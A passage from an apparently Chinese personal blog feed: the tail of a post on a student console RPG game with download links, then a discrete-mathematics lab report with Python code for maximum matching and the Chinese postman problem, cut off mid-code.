<div style="display: flex;">
  <div style="flex: 1; text-align: center;">
    <p>孙悟空</p>
    <img src="/img/Journey-to-the-West/4.png" alt="">
  </div>
  <div style="flex: 0.2; text-align: center;">
    <p></p>
    <img src="" alt="">
  </div>
  <div style="flex: 1; text-align: center;">
    <p>猪八戒</p>
    <img src="/img/Journey-to-the-West/5.png" alt="">
  </div>
</div>

<div style="display: flex;">
  <div style="flex: 1; text-align: center;">
    <p>沙悟净</p>
    <img src="/img/Journey-to-the-West/6.png" alt="">
  </div>
  <div style="flex: 0.2; text-align: center;">
    <p></p>
    <img src="" alt="">
  </div>
  <div style="flex: 1; text-align: center;">
    <p>唐三藏</p>
    <img src="/img/Journey-to-the-West/7.png" alt="">
  </div>
</div>

<h2 id="地图"><a href="#地图" class="headerlink" title="地图"></a>地图</h2><p><img src="/img/Journey-to-the-West/8.png" alt="地图"></p>
<h2 id="对战系统"><a href="#对战系统" class="headerlink" title="对战系统"></a>对战系统</h2><p><img src="/img/Journey-to-the-West/9.png" alt="对战系统"></p>
<h2 id="道具系统"><a href="#道具系统" class="headerlink" title="道具系统"></a>道具系统</h2><p><img src="/img/Journey-to-the-West/10.png" alt="道具系统"></p>
<h2 id="对话系统"><a href="#对话系统" class="headerlink" title="对话系统"></a>对话系统</h2><p><img src="/img/Journey-to-the-West/11.png" alt="对话系统"></p>
<h2 id="商店系统"><a href="#商店系统" class="headerlink" title="商店系统"></a>商店系统</h2><p><img src="/img/Journey-to-the-West/12.png" alt="商店系统"></p>
<h2 id="❤结语"><a href="#❤结语" class="headerlink" title="❤结语"></a>❤结语</h2><p>这是我们小组所提交的最终版本，总体参照老师发布的“<a href="/file/金庸群侠传console_rpg.rar">金庸群侠传</a>”制作。</p>
<p>尽管是最终提交版本，但是仍然存在许多未开发完善的功能以及部分bug。</p>
<p>所以，虽然该课题已结课，我仍然想继续开发完善此游戏（当然这次只有我一个人了，没有组员了）</p>
<p>后续将在这里继续更新该游戏版本↓</p>
<a href="/posts/Journey-to-the-West.html"  title="重生之西游记（下载地址及更新日志）" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/zmxy.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">重生之西游记（下载地址及更新日志）</div></div></a>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="*源代码"></a>*源代码</h2><h3 id="教师发布的参考游戏："><a href="#教师发布的参考游戏：" class="headerlink" title="教师发布的参考游戏："></a>教师发布的参考游戏：</h3><a href="/file/金庸群侠传console_rpg.rar"  title="金庸群侠传console_rpg.rar" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/rar.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">金庸群侠传console_rpg.rar</div></div></a>
<h3 id="游戏开发源代码："><a href="#游戏开发源代码：" class="headerlink" title="游戏开发源代码："></a>游戏开发源代码：</h3><a href="/file/重生之西游记.rar"  title="重生之西游记.rar" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/rar.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">重生之西游记.rar</div></div></a>
<h3 id="直接可运行的游戏应用程序（直接游玩请下载这个）："><a href="#直接可运行的游戏应用程序（直接游玩请下载这个）：" class="headerlink" title="直接可运行的游戏应用程序（直接游玩请下载这个）："></a>直接可运行的游戏应用程序（直接游玩请下载这个）：</h3><a href="/file/重生之西游记（2.3）.exe"  title="重生之西游记（2.3）.exe" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/exe.png" class="no-lightbox"></div><div class="link_content"><div class="link_title">重生之西游记（2.3）.exe</div></div></a>
<p>！注意事项：玩之前请先将<code>控制台 字体</code>调成<strong>黑体</strong>，体验更佳！不会的点<a href="https://fourfire.cc/posts/Gothic.html">这里</a>。</p>
]]></content>
      <categories>
        <category>游戏相关</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>游戏</tag>
        <tag>重生之西游记</tag>
      </tags>
  </entry>
  <entry>
    <title>离散数学II实验三（Python/C++）</title>
    <url>/posts/discrete_3.html</url>
    <content><![CDATA[<h1 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a><center>实验三</center></h1><h2 id="（一）实验题目"><a href="#（一）实验题目" class="headerlink" title="（一）实验题目"></a>（一）实验题目</h2><p>图的最大匹配与中国邮递员问题</p>
<h2 id="（二）实验目的"><a href="#（二）实验目的" class="headerlink" title="（二）实验目的"></a>（二）实验目的</h2><p>1、 掌握最大匹配,交错路径的定义；</p>
<p>2、 掌握最大匹配的求解方法；</p>
<p>3、 掌握中国邮递员问题与七桥问题的区别与联系；</p>
<p>4、 求简化加权图的中国邮递员问题解。</p>
<h2 id="（三）实验要求"><a href="#（三）实验要求" class="headerlink" title="（三）实验要求"></a>（三）实验要求</h2><ul>
<li><p>输入：无向简单连通图的关联矩阵</p>
<div style="display: flex; ">
    <div style="width: 250px;">
        <span>输入：无向简单连通图的关联矩阵</span>
        <div style="display: flex; align-items: center;">
            <span>（例如：</span>
            <img style="height:72px; margin:0 5px 0px" src="/img/discrete/3/2.png">
            <span>）。</span>
        </div>
    </div>
  <a>
        <img style="width: 150px;" src="/img/discrete/3/1.png" alt="">
  </a>
</div>
</li>
<li><p>输出1：此图的任意一个最大匹配及匹配数</p>
<p>（例如:M={e1,e3}，β1=2）。</p>
</li>
<li><p>输出2：假设各边的权相同，均为1。将该图作为中国邮递员问题的图，输出相应的最优环游解（例如：CPP解：e1e5e3e4e5e2）。</p>
</li>
</ul>
<h2 id="（四）实验内容和实验步骤"><a href="#（四）实验内容和实验步骤" class="headerlink" title="（四）实验内容和实验步骤"></a>（四）实验内容和实验步骤</h2><h3 id="1、需求分析"><a href="#1、需求分析" class="headerlink" title="1、需求分析"></a>1、需求分析</h3><ul>
<li><p>（1） 输入的形式和输入值的范围：</p>
<ul>
<li><p>输入形式：例如</p>
<p><img src="/img/discrete/3/3.png" alt="img"></p>
<p>（给定的关联矩阵）</p>
</li>
<li><p>输入值的范围：非负整数</p>
</li>
</ul>
</li>
<li><p>（2） 输出的形式：</p>
<p><img src="/img/discrete/3/4.png" alt="img"></p>
<ul>
<li><p>如图所示，输出时，按照实验要求的顺序依次展开输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">──所有的最大匹配（虽然只要求输出任意一个。）</span><br><span class="line">──匹配数</span><br><span class="line">──CPP解</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>（3） 程序所能实现的功能：</p>
<ul>
<li>l 能通过给定的无向简单图的关联矩阵，输出此图的最大匹配及匹配数，还能用作中国邮递员问题，输出相应的最优环路解</li>
<li>可循环，反复输入，方便测试多组数据</li>
</ul>
</li>
</ul>
<h3 id="2、-概要设计"><a href="#2、-概要设计" class="headerlink" title="2、 概要设计"></a>2、 概要设计</h3><ul>
<li><div style="display: flex; align-items: center;">
  <span>我选择的是</span>
    <img style="height:30px; margin:0 5px 0px" src="/img/discrete/3/python.png">
  <span>Python 进行编程，（后面写的C++同理，就不解析了）</span>
</div>
</li>
<li><p>下面是各函数的功能分析：</p>
<ul>
<li><ol>
<li><p>dfs</p>
<p>函数</p>
<ul>
<li>作用：该函数使用深度优先搜索（DFS）来找到图中所有可能的路径，然后通过回溯法将这些路径组合成可行解，并存储在<strong>ans</strong>列表中。同时，记录每个路径的长度并存储在<strong>setsize</strong>中。</li>
<li>实现细节：递归地探索图中的节点，选择一条边加入路径，然后继续深度搜索。通过回溯，将每次选择的边添加到<strong>ans</strong>中，形成完整路径。在每一步中，使用<strong>edgest</strong>和<strong>pointst</strong>来标记边和节点的访问状态。</li>
</ul>
</li>
<li><p>path_dfs</p>
<p>函数</p>
<ul>
<li>作用：该函数使用深度优先搜索（DFS）在邻接矩阵表示的图中找到从指定节点出发的路径，并存储在<strong>ans</strong>列表中。</li>
<li>实现细节：递归地探索节点的邻接节点，选择一条边加入路径，然后继续深度搜索。通过回溯，将每次选择的边添加到<strong>ans</strong>中，形成完整路径。递归的终止条件是节点没有未访问的邻接节点。</li>
</ul>
</li>
<li><p>construct_path</p>
<p>函数</p>
<ul>
<li>作用：该函数根据先前记录的前驱节点列表构建从起始节点到结束节点的路径，并将其存储在<strong>path</strong>列表中。</li>
<li>实现细节：从结束节点开始，沿着前驱节点逐步回溯到起始节点，将每个节点加入路径中。最后，反转路径，使其从起始节点到结束节点。</li>
</ul>
</li>
<li><p>dijkstra</p>
<p>函数</p>
<ul>
<li>作用：该函数实现了Dijkstra算法，计算从指定节点出发到其他所有节点的最短路径，并返回最短路径长度的列表。</li>
<li>实现细节：使用堆（优先队列）来优化Dijkstra算法，按照当前已知的最短路径长度从小到大进行探索。在每一步中，更新与当前节点相邻的节点的最短路径长度，同时记录前驱节点，以便后续构建路径。</li>
</ul>
</li>
<li><p>postman</p>
<p>函数</p>
<ul>
<li>作用：该函数解决中国邮递员问题（CPP），根据输入的关联矩阵构建图，并通过DFS、Dijkstra等算法找到最优路径。</li>
<li>实现细节：首先计算每个节点的度数，找出奇数度节点，并构建关联的图。对奇数度节点使用Dijkstra算法计算最短路径，然后利用DFS找到最优匹配，最终修复路径，使得每条边都至少被访问一次。</li>
</ul>
</li>
<li><p>search</p>
<p>函数</p>
<ul>
<li>作用：该函数使用DFS搜索从指定节点出发的所有路径，并将这些路径存储在<strong>result</strong>列表中。</li>
<li>实现细节：递归地探索节点的邻接节点，选择一条边加入路径，然后继续深度搜索。通过回溯，将每次选择的边添加到<strong>result</strong>中，形成完整路径。在每一步中，使用<strong>visited</strong>标记节点是否被访问，确保路径不会形成环。</li>
</ul>
</li>
<li><p>主函数部分</p>
<ul>
<li>作用：用户通过输入关联矩阵来定义图的结构，然后调用各函数求解中国邮递员问题。</li>
<li>实现细节：通过输入关联矩阵构建图结构，利用DFS找到所有可能的路径，并输出最大匹配。然后，使用DFS和Dijkstra算法解决中国邮递员问题，最终输出最优路径。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="3、详细设计"><a href="#3、详细设计" class="headerlink" title="3、详细设计"></a>3、详细设计</h3><ul>
<li>源代码：（Python和C++）</li>
</ul>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python:"></a>Python:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">u, n, m, grid, edgest, pointst, ans, setsize</span>):</span><br><span class="line">    <span class="keyword">if</span> u &gt; m:</span><br><span class="line">        path = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> edgest[i]:</span><br><span class="line">                path.append(i)</span><br><span class="line">        setsize.append(<span class="built_in">len</span>(path))</span><br><span class="line">        ans.append(path)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    temp = <span class="number">0</span></span><br><span class="line">    edge = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> grid[i][u] <span class="keyword">and</span> <span class="keyword">not</span> pointst[i]:</span><br><span class="line">            temp += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp == <span class="number">1</span>:</span><br><span class="line">                edge[<span class="number">0</span>] = i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                edge[<span class="number">1</span>] = i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> temp == <span class="number">2</span>:</span><br><span class="line">        edgest[u] = <span class="literal">True</span></span><br><span class="line">        pointst[edge[<span class="number">0</span>]] = <span class="literal">True</span></span><br><span class="line">        pointst[edge[<span class="number">1</span>]] = <span class="literal">True</span></span><br><span class="line">        dfs(u + <span class="number">1</span>, n, m, grid, edgest, pointst, ans, setsize)</span><br><span class="line">        edgest[u] = <span class="literal">False</span></span><br><span class="line">        pointst[edge[<span class="number">0</span>]] = <span class="literal">False</span></span><br><span class="line">        pointst[edge[<span class="number">1</span>]] = <span class="literal">False</span></span><br><span class="line">        dfs(u + <span class="number">1</span>, n, m, grid, edgest, pointst, ans, setsize)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dfs(u + <span class="number">1</span>, n, m, grid, edgest, pointst, ans, setsize)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">path_dfs</span>(<span class="params">x, graph, n, ans</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> graph[x][y] &gt; <span class="number">0</span>:</span><br><span class="line">            graph[x][y] -= <span class="number">1</span></span><br><span class="line">            graph[y][x] -= <span class="number">1</span></span><br><span class="line">            path_dfs(y, graph, n, ans)</span><br><span class="line">    ans.append(x)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_path</span>(<span class="params">precursor, start, end, path</span>):</span><br><span class="line">    path.clear()</span><br><span class="line">    curr = end</span><br><span class="line">    <span class="keyword">while</span> curr != start:</span><br><span class="line">        path.append(curr)</span><br><span class="line">        curr = precursor[curr]</span><br><span class="line">    path.append(start)</span><br><span class="line">    path.reverse()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dijkstra</span>(<span class="params">start, distance, precursor, adjacency_matrix</span>):</span><br><span class="line">    INF = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    n = <span class="built_in">len</span>(adjacency_matrix)</span><br><span class="line">    distance = [INF] * n</span><br><span class="line">    distance[start] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    pq = [(<span class="number">0</span>, start)]</span><br><span class="line">    heapq.heapify(pq)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> pq:</span><br><span class="line">        dist, curr_node = heapq.heappop(pq)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> dist &gt; distance[curr_node]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> adjacency_matrix[curr_node][i] != INF:</span><br><span class="line">                new_distance = dist + adjacency_matrix[curr_node][i]</span><br><span class="line">                <span class="keyword">if</span> new_distance &lt; distance[i]:</span><br><span class="line">                    distance[i] = new_distance</span><br><span class="line">                    precursor[i] = curr_node</span><br><span class="line">                    heapq.heappush(pq, (new_distance, i))</span><br><span class="line">    <span class="keyword">return</span> distance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">postman</span>(<span class="params">n, m, grid</span>):</span><br><span class="line">    flag1, flag2, flag3 = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line">    path = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">if</span> grid[i][j]:</span><br><span class="line">                <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">        path.append(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line">    odd = <span class="number">0</span></span><br><span class="line">    odd_num = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> path[i] % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            odd += <span class="number">1</span></span><br><span class="line">            odd_num.append(i)</span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    graph = [[<span class="number">0</span>] * <span class="number">100</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line">    ed = [[<span class="number">0</span>] * <span class="number">100</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        arr = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> grid[i][j]:</span><br><span class="line">                arr.append(i)</span><br><span class="line">        L, r = arr[<span class="number">0</span>], arr[<span class="number">1</span>]</span><br><span class="line">        graph[L][r] = <span class="number">1</span></span><br><span class="line">        graph[r][L] = <span class="number">1</span></span><br><span class="line">        ed[L][r] = j</span><br><span class="line">        ed[r][L] = j</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> odd != <span class="number">0</span>:</span><br><span class="line">        dfs_grid_st = [<span class="number">0</span>] * <span class="number">100</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path)):</span><br><span class="line">            dfs_grid_st[path[i]] = i</span><br><span class="line">        odd_grid = [[<span class="number">0</span>] * <span class="number">100</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">        odd_path = [[[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(odd)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(odd)]</span><br><span class="line"></span><br><span class="line">        INF = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        adjacency_matrix = [[INF] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        ans = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            arr = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">if</span> grid[i][j]]</span><br><span class="line">            L, r = arr[<span class="number">0</span>], arr[<span class="number">1</span>]</span><br><span class="line">            adjacency_matrix[L][r] = <span class="number">1</span></span><br><span class="line">            adjacency_matrix[r][L] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            adjacency_matrix[i][i] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">            start = odd_num[i]</span><br><span class="line">            distance = []</span><br><span class="line">            precursor = [-<span class="number">1</span>] * n</span><br><span class="line">            distance = <span class="built_in">list</span>(dijkstra(start, distance, precursor, adjacency_matrix))</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(distance)):</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">                    <span class="keyword">if</span> odd_num[z] == k:</span><br><span class="line">                        odd_grid[i][z] = distance[k]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    odd_path[i][j].append(<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                path = []</span><br><span class="line">                end = odd_num[j]</span><br><span class="line">                construct_path(precursor, start, end, path)</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path)):</span><br><span class="line">                    x = path[k]</span><br><span class="line">                    odd_path[i][j].append(x)</span><br><span class="line"></span><br><span class="line">        ans_dfs = []</span><br><span class="line">        set_size = []</span><br><span class="line">        edgest = [<span class="literal">False</span>] * <span class="number">100</span></span><br><span class="line">        pointst = [<span class="literal">False</span>] * <span class="number">100</span></span><br><span class="line"></span><br><span class="line">        dfs_grid = [[<span class="number">0</span>] * <span class="number">1000</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">        ed_dfs = [[<span class="number">0</span>] * <span class="number">100</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">                ed_dfs[i][j] = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(p + <span class="number">1</span>, odd):</span><br><span class="line">                <span class="keyword">if</span> odd_grid[p][z]:</span><br><span class="line">                    dfs_grid[p][idx] = <span class="number">1</span></span><br><span class="line">                    dfs_grid[z][idx] = <span class="number">1</span></span><br><span class="line">                    ed_dfs[p][z] = idx</span><br><span class="line">                    ed_dfs[z][p] = idx</span><br><span class="line">                    idx += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        dfs(<span class="number">0</span>, odd, idx, dfs_grid, edgest, pointst, ans_dfs, set_size)</span><br><span class="line">        length = <span class="built_in">len</span>(ans_dfs)</span><br><span class="line">        max_match = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            <span class="keyword">if</span> set_size[i] &gt; max_match:</span><br><span class="line">                max_match = i</span><br><span class="line"></span><br><span class="line">        res_long = <span class="built_in">len</span>(ans_dfs[max_match])</span><br><span class="line">        mindfs = INF</span><br><span class="line">        flagdfs = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            <span class="keyword">if</span> set_size[k] == res_long:</span><br><span class="line">                sum_val = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(res_long):</span><br><span class="line">                    <span class="keyword">for</span> edi <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">                        <span class="keyword">for</span> edj <span class="keyword">in</span> <span class="built_in">range</span>(edi + <span class="number">1</span>, odd):</span><br><span class="line">                            <span class="keyword">if</span> ans_dfs[k][i] == ed_dfs[edi][edj]:</span><br><span class="line">                                sum_val += <span class="built_in">len</span>(odd_path[edi][edj]) - <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> sum_val &lt; mindfs:</span><br><span class="line">                    mindfs = sum_val</span><br><span class="line">                    flagdfs = k</span><br><span class="line"></span><br><span class="line">        final_ans = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(res_long):</span><br><span class="line">            <span class="keyword">for</span> edi <span class="keyword">in</span> <span class="built_in">range</span>(odd):</span><br><span class="line">                <span class="keyword">for</span> edj <span class="keyword">in</span> <span class="built_in">range</span>(edi + <span class="number">1</span>, odd):</span><br><span class="line">                    <span class="keyword">if</span> ans_dfs[flagdfs][i] == ed_dfs[edi][edj]:</span><br><span class="line">                        final_ans.append(odd_path[edi][edj])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final_ans)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(final_ans[i]) - <span class="number">1</span>):</span><br><span class="line">                Le, ri = final_ans[i][j], final_ans[i][j + <span class="number">1</span>]</span><br><span class="line">                graph[Le][ri] += <span class="number">1</span></span><br><span class="line">                graph[ri][Le] += <span class="number">1</span></span><br><span class="line">    ans = []</span><br><span class="line">    ans = path_dfs(<span class="number">0</span>, graph, n, ans)</span><br><span class="line">    need_len = <span class="built_in">len</span>(ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CPP解：&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(need_len - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;e<span class="subst">&#123;ed[ans[i]][ans[i + <span class="number">1</span>]] + <span class="number">1</span>&#125;</span>&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># dfs搜索从start点开始的所有路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">visited, start, re</span>):</span><br><span class="line">    vi = copy.deepcopy(visited)</span><br><span class="line">    vi[start] = <span class="literal">True</span></span><br><span class="line">    r = copy.deepcopy(re)</span><br><span class="line">    r.append(start)</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> adj_points[start]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> vi[i]:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            search(vi, i, r)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        result.append(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;# 请输入关联矩阵：（输入‘0’退出）&quot;</span>)</span><br><span class="line">    grid = [[<span class="number">0</span>] * <span class="number">1000</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">    cin = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cin == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> cin:</span><br><span class="line">        row = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, cin.split()))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(row)):</span><br><span class="line">            grid[count][i] = row[i]</span><br><span class="line">        cin = <span class="built_in">input</span>()</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    n = count</span><br><span class="line">    m = <span class="built_in">len</span>(row)</span><br><span class="line">    inc = [[<span class="number">0</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            inc[j][i] = grid[i][j]</span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line">    set_size = []</span><br><span class="line">    edgest = [<span class="literal">False</span>] * <span class="number">100</span></span><br><span class="line">    pointst = [<span class="literal">False</span>] * <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    dfs(<span class="number">0</span>, n, m, grid, edgest, pointst, ans, set_size)</span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(ans)</span><br><span class="line">    max_match = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> set_size[i] &gt; max_match:</span><br><span class="line">            max_match = i</span><br><span class="line"></span><br><span class="line">    res_long = <span class="built_in">len</span>(ans[max_match])</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> set_size[k] == res_long:</span><br><span class="line">            <span class="keyword">if</span> count:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;最大匹配：M = &#123; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;         M = &#123; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(res_long):</span><br><span class="line">                <span class="keyword">if</span> i == res_long-<span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;e<span class="subst">&#123;ans[k][i] + <span class="number">1</span>&#125;</span>&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;e<span class="subst">&#123;ans[k][i] + <span class="number">1</span>&#125;</span>&quot;</span>, end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 点的数量</span></span><br><span class="line">    v_count = <span class="built_in">len</span>(inc[<span class="number">0</span>])</span><br><span class="line">    <span class="comment"># 找到所有点的邻接节点，方便用dfs搜索路径</span></span><br><span class="line">    adj_points = 